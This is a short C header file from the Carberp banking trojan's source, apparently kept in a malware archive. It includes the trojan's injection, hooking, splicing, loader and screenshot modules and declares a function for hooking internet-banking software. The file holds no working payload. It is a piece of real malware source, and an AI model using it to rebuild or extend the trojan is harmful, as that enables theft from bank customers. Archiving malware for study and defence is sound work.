/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef IbankH
#define IbankH


//#ifdef RuBnkH
#include <windows.h>

#include "Crypt.h"
#include "GetApi.h"
#include "DllLoader.h"
#include "Memory.h"

#include "Utils.h"
#include "BotUtils.h"
#include "Inject.h"

#include "Unhook.h"
#include "Splice.h"
#include "Loader.h"
#include "Config.h"
#include "Screens.h"
#include "Inject.h"
#include "CabPacker.h"
#include "ntdll.h"
#include "Trade.h"
//#include "Inist.h"
//#include "Cyberplat.h"

bool IbankHooks();
bool checkFileFlag();


#endif